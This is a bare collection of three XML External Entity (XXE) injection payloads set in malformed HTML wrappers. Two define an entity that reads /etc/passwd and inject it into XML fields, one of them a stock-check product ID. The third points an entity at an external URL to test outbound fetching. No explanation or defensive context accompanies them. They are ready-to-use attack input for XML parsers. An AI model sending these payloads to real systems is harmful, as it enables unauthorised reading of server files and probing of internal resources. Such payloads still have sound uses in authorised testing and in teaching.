

<html>
<body>
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE foo 
[<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<FUNCTION>
<NAME>&xxe;</NAME>
</FUNCTION>
</body>
</xml>
</html>


<html>
<body>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
</body>
</xml>
</html>

<html>
<body>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://en.wikipedia.org/"> ]>
</body>
</xml>
</html>